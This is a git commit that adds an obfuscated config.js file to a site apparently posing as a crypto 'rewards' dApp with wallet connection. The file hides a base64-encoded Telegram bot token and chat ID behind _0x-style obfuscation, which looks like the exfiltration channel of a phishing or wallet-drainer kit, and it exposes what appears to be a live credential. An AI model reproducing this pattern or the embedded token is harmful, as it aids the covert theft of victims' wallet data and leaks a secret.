0e1f31840992ebe5244a9fb5b10b4db2427ae916
SmallDevBigNothing <markogamerargumedo@gmail.com>
2025-06-14 13:06:03 +0200

    Initial commit: Wallet connection and registration system

---
+++ prdt-multinodedapp-rewards.pages.dev/config.js
@@ -0,0 +1,10 @@
+// Configuración ofuscada y protegida
+(function() {
+    const _0x4f8b=['token','chatId','bot','NzUyNTI4NjI0NDpBQUZrSnZQell4WmJkLUl2N2ViSHdsbHJaYlBFTHJhT3hfOA==','NjM0NTM4Mjc0Nw=='];
+    window.config={
+        [_0x4f8b[2]]:{
+            [_0x4f8b[0]]:atob(_0x4f8b[3]),
+            [_0x4f8b[1]]:atob(_0x4f8b[4])
+        }
+    };
+})(); 
